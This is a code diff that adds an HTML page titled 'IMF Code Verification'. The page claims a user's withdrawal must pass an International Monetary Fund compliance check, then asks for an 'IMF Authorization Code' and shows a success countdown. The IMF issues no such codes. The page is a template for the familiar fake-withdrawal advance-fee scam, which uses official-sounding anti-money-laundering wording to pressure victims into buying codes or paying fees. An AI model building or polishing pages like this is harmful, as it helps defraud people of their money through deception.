@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>IMF Code Verification</title>
+  <link rel="stylesheet" href="css/serial.css" />
+</head>
+<body>
+  <div class="container fade-in">
+    <div class="card glass">
+      <img src="images/imf-logo.png" alt="IMF Verification" class="imf-logo" />
+
+      <h2>IMF Code Verification</h2>
+
+      <p class="info-text">
+        To complete your withdrawal, your transaction must first undergo an 
+        <strong>International Monetary Fund (IMF) compliance verification</strong>.  
+        <!-- <br><br> -->
+        This process ensures that all international transfers meet global financial regulations, 
+        including anti-money laundering (AML) and cross-border transaction monitoring standards.  
+        <!-- <br><br> -->
+        You are therefore required to provide a valid 
+        <strong>IMF Authorization Code</strong> assigned to your transaction.  
+        This code serves as confirmation that your transfer has been approved 
+        through the international remittance clearance system.  
+        <br><br>
+        Please enter your <strong>IMF Code</strong> below to authorize and finalize the release of your funds. 
+        Failure to provide the correct code will result in a delay in the completion of your withdrawal.
+      </p>
+
+      <form id="imfForm">
+        <input type="text" id="imfInput" placeholder="Enter IMF Authorization Code" required />
+        <button type="submit">Verify</button>
+      </form>
+
+      <p id="errorMsg" class="error hidden">❌ Invalid or unauthorized IMF Code. Please verify and try again.</p>
+
+      <div id="timerContainer" class="hidden">
+        <p>
+          ✅ <strong>Code verified successfully!</strong><br>
+          Your transaction is now being processed through the international settlement network.
+          Please wait for confirmation. Do not close or refresh the page.
+        </p>
+        <div id="timer">30</div>
+      </div>
+    </div>
+  </div>
+
+  <script src="js/serial.js"></script>
+</body>
+</html>
